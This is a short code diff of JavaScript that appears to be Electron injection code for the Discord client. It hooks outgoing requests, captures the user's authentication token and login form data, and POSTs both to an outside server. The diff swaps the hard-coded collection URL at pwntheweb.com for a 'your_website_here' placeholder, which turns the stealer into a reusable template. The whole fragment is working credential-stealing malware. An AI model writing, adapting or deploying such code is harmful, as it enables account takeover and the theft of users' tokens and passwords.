@@ -16,7 +16,7 @@ session.defaultSession.webRequest.onBeforeSendHeaders(filter,(details,callback)=
     currentToken = tokenHeader;
     var postData = JSON.stringify({"token":tokenHeader});
     const request = net.request({
-      url:'https://pwntheweb.com/discord_test_thing.php',
+      url:'your_website_here',
       method:'post',
       headers: {
         'Content-Type':'application/x-www-form-urlencoded'
@@ -29,7 +29,7 @@ session.defaultSession.webRequest.onBeforeSendHeaders(filter,(details,callback)=
     const buffer = Array.from(details.uploadData)[0].bytes;
     var loginData = JSON.stringify({"loginData":buffer.toString()});
     const loginRequest = net.request({
-      url:'https://pwntheweb.com/discord_test_thing.php',
+      url:'your_website_here',
       method:'post',
       headers: {
         'Content-Type':'application/x-www-form-urlencoded'
